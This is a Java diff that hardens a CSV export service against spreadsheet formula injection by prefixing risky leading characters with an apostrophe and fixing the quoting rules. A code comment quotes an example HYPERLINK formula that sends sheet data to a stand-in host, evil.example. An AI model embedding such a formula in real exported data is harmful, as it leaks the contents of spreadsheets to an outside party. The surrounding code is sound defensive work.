@@ -179,13 +179,41 @@ public class CsvExportService {
                 .collect(Collectors.joining("; "));
     }
 
-    private String csvEscape(String value) {
+    // Spreadsheet formula injection. Exercise names, tags, setup-field names and values, and both
+    // kinds of note are all free text a household member typed, and they all land in a file that
+    // is opened in Excel, Numbers or Sheets. A value starting = + - @ (or a tab/CR, which some
+    // parsers treat the same way) is evaluated as a FORMULA by those applications, so a name like
+    //   =HYPERLINK("https://evil.example/?d="&A1,"Click")
+    // exfiltrates the sheet to whoever opens it. HYPERLINK and cell-reference tricks do not
+    // prompt the way DDE does.
+    //
+    // The OWASP mitigation is a leading apostrophe, which those applications consume as "treat
+    // the rest as text". CsvImportParser.stripFormulaGuard removes it again on the way back in,
+    // so the round trip still yields the original string -- without that, exporting and
+    // re-importing a name beginning with "-" would produce a DIFFERENT name and duplicate-
+    // detection would stop recognising it.
+    // THE definition. CsvImportParser reads this same constant rather than keeping its own
+    // copy, so the set of characters the exporter guards and the set the importer unguards
+    // cannot drift -- the same "one derivation, two consumers" rule the rest of the CSV round
+    // trip follows (docs/architecture/import-export.md).
+    public static final String FORMULA_TRIGGERS = "=+-@\t\r";
+
+    // Package-private and static so CsvFormulaInjectionTest can assert the escaping directly,
+    // with no database and no Spring context.
+    static String csvEscape(String value) {
         if (value == null) {
             return "";
         }
-        if (value.contains(",") || value.contains("\"") || value.contains("\n")) {
-            return "\"" + value.replace("\"", "\"\"") + "\"";
+        String escaped = value;
+        if (!escaped.isEmpty() && FORMULA_TRIGGERS.indexOf(escaped.charAt(0)) >= 0) {
+            escaped = "'" + escaped;
         }
-        return value;
+        // A bare carriage return breaks row structure just as a newline does, and was missing
+        // from this condition.
+        if (escaped.contains(",") || escaped.contains("\"") || escaped.contains("\n")
+                || escaped.contains("\r") || escaped.startsWith("'")) {
+            return "\"" + escaped.replace("\"", "\"\"") + "\"";
+        }
+        return escaped;
     }
 }
